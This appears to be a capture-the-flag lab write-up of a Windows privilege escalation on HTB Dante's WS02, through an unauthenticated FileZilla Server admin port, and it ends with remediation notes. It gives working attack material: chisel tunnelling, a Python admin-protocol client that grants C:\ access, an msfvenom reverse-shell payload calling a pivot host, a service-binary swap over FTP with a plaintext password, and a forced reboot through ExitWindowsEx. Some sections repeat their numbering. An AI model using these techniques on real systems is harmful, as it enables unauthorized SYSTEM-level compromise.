# HTB Dante — WS02 Privilege Escalation (`dharding` → SYSTEM)

**Target:** `DANTE-WS02` (172.16.1.101)
**Starting point:** local user `dharding`, access via WinRM (Evil-WinRM), credentials already in hand.

## 1. Enumeration (winPEAS)

Ran winPEAS as `dharding`. Two findings looked promising; only one panned out.

### DPAPI master keys / credential blob (dead end)

winPEAS flagged DPAPI master keys and a "Local Credential Data" credential file under `dharding`'s profile. Initially suspected as the privesc vector, but dismissed: DPAPI master keys for a logged-on user decrypt with that *same* user's own password/session — recovering them doesn't cross a privilege boundary by itself. It would only matter if the credential blob held a *different*, higher-privileged principal's cached creds (e.g. via `cmdkey /add`). Checked with `cmdkey /list` — nothing stored there. Not the path.

### FileZilla Server 0.9.60 beta (the real vector)

- Service `FileZilla Server FTP server` listed by winPEAS as `Autoload` with no explicit service account — defaults to **LocalSystem**.
- Admin interface listening on `127.0.0.1:14147` (loopback-only, confirmed via netstat — not reachable externally).
- `C:\Program Files (x86)\FileZilla Server\FileZilla Server.xml` contained:
i.e. a **blank admin password** (explicitly set to empty, not "unset").
    
    ```xml
    <Item name="Admin Password" type="string"></Item>
    ```
    

This is the real vector: a local FTP service running as SYSTEM, with an unauthenticated local admin control channel.

## 2. Exposing the loopback-only admin port

The admin interface only listens on `127.0.0.1` on the target, so it's unreachable directly from the attacker's box. Used **chisel** to reverse-tunnel it out:

```bash
# on WS02, as dharding:
chisel.exe client 172.16.1.100:8080 R:14147:127.0.0.1:14147

# on attack box:
chisel server --reverse
```

This exposed the target's `127.0.0.1:14147` as `127.0.0.1:14147` on the attacker's machine.

## 3. Failed GUI approaches

- **RDP** (`xfreerdp`) — failed outright. Port 3389 wasn't present anywhere in winPEAS's TCP listener enumeration, meaning no RDP/Terminal Services listener is running on WS02 at all, despite `dharding` being a member of `Remote Desktop Users`.
- **Wine + `FileZilla Server Interface.exe`** — the legitimate GUI admin client, pulled off the target via Evil-WinRM `download`. Dead end: the attack box (Debian testing / Parrot) has fully dropped 32-bit Wine/multiarch support — no `wine32` package exists in current repos, `dpkg --add-architecture i386` + search turned up nothing installable, and the installed `wine64` package's newer built-in WoW64 mode never produced a working `syswow64` (confirmed via `wineboot --init` — no `syswow64` directory was created at all). No 32-bit execution path was available on this attack host.

## 4. Speaking the admin protocol directly

Instead of continuing to fight Wine, found [`PolarbearDK/Miracle.FileZilla.Api`](https://github.com/PolarbearDK/Miracle.FileZilla.Api) on GitHub — a C# reference implementation of FileZilla Server's proprietary binary admin protocol. Cloned it and read the source (`FileZillaServerProtocol.cs`, `Authentication.cs`, `AccountSettings.cs`, `Group.cs`, `User.cs`, `SharedFolder.cs`, `BinaryExtensions.cs`, etc.) to extract the exact wire format:

- **Framing:** `[1-byte cmd][4-byte little-endian length][payload]`, where `cmd = origin(2 bits) | messageType << 2`.
- **Handshake:** `"FZS"` magic → big-endian-length-prefixed server-version and protocol-version integers → optional auth-required flag plus MD5 challenge nonces.
- **Auth (if required):** response = `MD5(nonce1 + password + nonce2)`.
- **AccountSettings:** a `MessageType.AccountSettings` (`0x6`) request/reply carrying the **entire** Groups+Users list. `Set` replaces everything server-side, so the full existing structure has to be round-tripped (fetched, modified, sent back whole), not just the target user.

Ported the relevant subset to pure Python — `fzadmin.py`, stdlib only, no dependencies — implementing the reader/writer primitives, `Group`/`User`/`SharedFolder`/`SpeedLimit` (de)serialization, and the `connect → auth → GetAccountSettings → modify → SetAccountSettings` flow.

## 5. Exploiting it

```bash
python3 fzadmin.py --host 127.0.0.1 --port 14147 --password "" --user dharding --dir 'C:\' -v
```

Output:

```
Fetched 0 groups, 1 users
  user: dharding    home_dirs=['C:\Users\dharding\Documents\ftp']
SetAccountSettings success=True
User 'dharding' now has full access rooted at C:\
```

Steps performed by the script:

1. Connected to the tunneled admin port; no auth challenge came through in practice (blank password → effectively open).
2. Pulled `AccountSettings`: 1 existing user (`dharding`), home dir jailed to `C:\Users\dharding\Documents\ftp`.
3. Replaced `dharding`'s `SharedFolders` with a single entry: `C:\` with full rights — `DirCreate | DirDelete | DirList | DirSubdirs | FileAppend | FileDelete | FileRead | FileWrite | IsHome`.
4. Sent the modified structure back via `SetAccountSettings` — server replied success.

## 6. Result

`dharding`'s existing FTP credentials now have a home directory of `C:\` with full read/write/delete, over a service running as **LocalSystem** — i.e. arbitrary filesystem read/write as SYSTEM via plain FTP (port 21):

```
ftp dharding@172.16.1.101
cd Users/Administrator/Desktop
get root.txt
```

From there, standard SYSTEM-file-write escalation options apply if an interactive SYSTEM shell (rather than just file access) is the end goal — e.g. drop a payload somewhere SYSTEM will execute it, or pull the SAM/SYSTEM hives directly over FTP.

## Root cause

FileZilla Server's local admin control channel had no authentication configured, and the service itself runs with SYSTEM privileges. A local, unauthenticated management interface on a SYSTEM-level service is a full privilege-escalation primitive by design — no code vulnerability in the FTP daemon itself was required.

```
def log(self, *a):
    if self.verbose:
        print(*a, file=sys.stderr)

def send_command(self, msg_type, payload=b''):
    cmd = (ORIGIN_CLIENT) | (msg_type << 2)
    out = bytes([cmd & 0xFF]) + struct.pack('<i', len(payload)) + payload
    self.sock.sendall(out)
    self.log("-> sent type=%d len=%d" % (msg_type, len(payload)))

def receive_message(self, expected_type, retries=30):
    for _ in range(retries):
        cmd = self.r.u8()
        origin = cmd & 0x3
        mtype = cmd >> 2
        length = self.r.i32()
        payload = self.r.read(length) if length > 0 else b''
        self.log("<- recv origin=%d type=%d len=%d" % (origin, mtype, length))
        if origin == ORIGIN_SERVERREPLY and mtype == expected_type:
            return payload
        elif origin == ORIGIN_SERVERMESSAGE:
            if mtype == MSG_EVENT and len(payload) > 1:
                try:
                    self.log("   [event] %s" % payload[1:].decode('utf-8', 'replace'))
                except Exception:
                    pass
            continue
        elif origin == ORIGIN_SERVERREPLY and mtype == MSG_AUTHENTICATE:
            continue
        elif origin == ORIGIN_SERVERREPLY and mtype == MSG_ERROR:
            msg = payload[1:].decode('utf-8', 'replace') if len(payload) > 1 else '(no message)'
            raise ProtocolError("Server error: %s" % msg)
        else:
            raise ProtocolError("Unexpected message origin=%d type=%d len=%d" % (origin, mtype, length))
    raise ProtocolError("Timed out waiting for message type %d" % expected_type)

def connect_and_auth(self, password):
    magic = self.r.read(3)
    if magic != b'FZS':
        raise ProtocolError("Bad magic %r - not a FileZilla Server admin port" % magic)

    len1 = self.r.u16be()
    sv_bytes = self.r.read(len1) if len1 > 0 else b''
    self.server_version = struct.unpack('<i', sv_bytes)[0] if len(sv_bytes) == 4 else None

    len2 = self.r.u16be()
    pv_bytes = self.r.read(len2) if len2 > 0 else b''
    self.protocol_version = struct.unpack('<i', pv_bytes)[0] if len(pv_bytes) == 4 else 0

    self.log("Server version bytes=%r Protocol version=0x%08x" % (sv_bytes, self.protocol_version))

    no_password_required = True
    nonce1 = nonce2 = b''
    self.sock.settimeout(3)
    try:
        flag = self.r.u8()
        no_password_required = (flag != 0)
        blob_len = self.r.i32()
        inner = Reader(data=self.r.read(blob_len))
        n1 = inner.u16be()
        nonce1 = inner.read(n1)
        n2 = inner.u16be()
        nonce2 = inner.read(n2)
    except (ProtocolError, socket.timeout):
        no_password_required = True
    finally:
        self.sock.settimeout(15)

    self.log("NoPasswordRequired=%s nonce1=%d bytes nonce2=%d bytes" % (no_password_required, len(nonce1), len(nonce2)))

    if not no_password_required:
        data_to_hash = nonce1 + password.encode('utf-8') + nonce2
        auth_hash = hashlib.md5(data_to_hash).digest()
        self.send_command(MSG_AUTHENTICATE, auth_hash)
        reply = self.receive_message(MSG_AUTHENTICATE)
        if len(reply) != 0:
            raise ProtocolError("Unexpected non-empty Authenticate reply (len=%d) - wrong password?" % len(reply))
        self.log("Authenticated OK")
    else:
        self.log("No authentication required")

def get_account_settings(self):
    self.send_command(MSG_ACCOUNTSETTINGS)
    payload = self.receive_message(MSG_ACCOUNTSETTINGS)
    if len(payload) == 1:
        raise ProtocolError("Get returned a bool (%s) instead of AccountSettings" % (payload[0] == 0))
    pr = Reader(data=payload)
    use24 = self.protocol_version >= V_USER16M
    groups = read_top_list(pr, Group, self.protocol_version, use24)
    users = read_top_list(pr, User, self.protocol_version, use24)
    return groups, users

def set_account_settings(self, groups, users):
    w = Writer()
    use24 = self.protocol_version >= V_USER16M
    write_top_list(w, groups, self.protocol_version, use24)
    write_top_list(w, users, self.protocol_version, use24)
    self.send_command(MSG_ACCOUNTSETTINGS, w.bytes_())
    payload = self.receive_message(MSG_ACCOUNTSETTINGS)
    if len(payload) != 1:
        raise ProtocolError("Unexpected Set reply length %d" % len(payload))
    return payload[0] == 0  # per protocol: 0 == success
```

## 5. Exploitation: FileZilla Server binary hijack

### 5.1 Payload generation

Built a Windows x64 reverse-shell payload in `exe-service` format (so it correctly answers the SCM's service-control handshake when launched by `services.exe`):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.100 LPORT=4444 \
  -f exe-service -o FileZilla_Server_reverse.exe
```

`172.16.1.100` was a pivot host reachable from ws02, with a ligolo-ng listener on port 4444 forwarding back to the operator.

(An earlier `windows/x64/shell_bind_tcp` version was tried first and staged, then swapped for the reverse-shell version once the ligolo listener was available — bind shells avoid pivot-routing questions but reverse shells were preferred here since the callback path was already set up.)

### 5.2 Swapping the running service binary

The live `FileZilla Server.exe` is locked while the SYSTEM service is running, so a direct FTP `STOR` overwrite fails (`550 Could not open file for writing`). Windows permits **renaming** a running executable (the live process keeps its already-open handle to the old file), which frees up the original path:

```python
import ftplib

TARGET     = '/Program Files (x86)/FileZilla Server/FileZilla Server.exe'
TARGET_BAK = '/Program Files (x86)/FileZilla Server/FileZilla Server.exe.bak'

ftp = ftplib.FTP()
ftp.connect('172.16.1.101', 21)
ftp.login('dharding', 'WestminsterOrange5')

# 1. Back up the original binary locally first
with open('FileZilla_Server.exe.orig_backup', 'wb') as f:
    ftp.retrbinary('RETR %s' % TARGET, f.write)

# 2. Rename the running exe out of the way (does not disturb the running process)
ftp.rename(TARGET, TARGET_BAK)

# 3. Upload the payload to the now-free original path
with open('FileZilla_Server_reverse.exe', 'rb') as f:
    ftp.storbinary('STOR %s' % TARGET, f)
```

The running FTP/admin service kept functioning normally throughout (still backed by the renamed `.bak` file's open handle), so this was done without any service interruption or detection risk from a monitoring standpoint.

### 5.3 Dead end: no-reboot DLL side-load

Before pursuing a reboot, tested whether the SYSTEM process could be made to load a malicious DLL live (no restart needed), since `Enable SSL: 0` in the server config suggested `libeay32.dll`/`ssleay32.dll` (OpenSSL) might not yet be loaded. Tested by attempting to overwrite `libeay32.dll` via FTP — it was **locked** (`550 Could not open file for writing`), confirming these are implicitly linked and loaded at process start regardless of the SSL feature toggle. This path was abandoned; a genuine service restart was required.

### 5.4 Getting a restart without admin rights

- `shutdown /r /t 0` from the WinRM shell → **Access is denied (5)**. `SeShutdownPrivilege` covers local/interactive shutdown only; `shutdown.exe` calls `InitiateSystemShutdownEx`, which additionally requires `SeRemoteShutdownPrivilege` when invoked from a non-console (e.g. WinRM/network) session — `dharding` doesn't have that privilege.
- `Get-Service` also failed (`Cannot open Service Control Manager`) — confirmed `dharding` has **zero** SCM access (not even query rights), ruling out any `Restart-Service`/`sc.exe` based restart of the FileZilla service specifically.
- **Bypass:** `InitiateSystemShutdownEx`'s extra remote-session check is a Win32-layer restriction, not enforced by the lower-level `user32.dll!ExitWindowsEx` it wraps. `ExitWindowsEx` only requires `SeShutdownPrivilege` to be present and enabled in the caller's token — which `dharding` already had. Calling it directly via P/Invoke skips the remote-shutdown gate entirely:
    
    ```powershell
    $sig = '[DllImport("user32.dll", SetLastError=true)] public static extern bool ExitWindowsEx(uint uFlags, uint dwReason);'
    Add-Type -MemberDefinition $sig -Name Win32 -Namespace PInvoke
    [PInvoke.Win32]::ExitWindowsEx(6, 0)   # EWX_REBOOT (0x2) | EWX_FORCE (0x4)
    ```
    
    This forced an immediate reboot using only the local `SeShutdownPrivilege` already granted to `dharding`.
    

### 5.5 Payoff

On boot, the SCM auto-started `FileZilla Server FTP server` (Autoload/Automatic), launching the payload now sitting at `C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe` — **as SYSTEM**. The `exe-service`-formatted payload satisfied the SCM handshake long enough to fire its reverse shell to `172.16.1.100:4444`, which the operator's ligolo-ng listener forwarded back, yielding an interactive **SYSTEM** shell on DANTE-WS02.

## 8. Root causes / notes for remediation

- FileZilla Server running as `LocalSystem` with an FTP account whose home directory is the entire `C:\` drive — any FTP credential compromise is immediately a full-disk, SYSTEM-privileged read/write primitive.
- FileZilla Server admin interface configured with no password.
- Service binary directory (`C:\Program Files (x86)\FileZilla Server\`) writable by the same SYSTEM-backed FTP account that can reach it — the service should run under a dedicated low-privileged service account, and its install directory should never be reachable from the FTP-exposed home tree.
- `SeShutdownPrivilege` granted to a standard user is sufficient to force a reboot despite `SeRemoteShutdownPrivilege` being withheld, because `ExitWindowsEx` doesn't enforce the same remote-session check `shutdown.exe`/`InitiateSystemShutdownEx` does. If unprivileged reboot capability is unwanted, `SeShutdownPrivilege` should be removed from standard user groups.
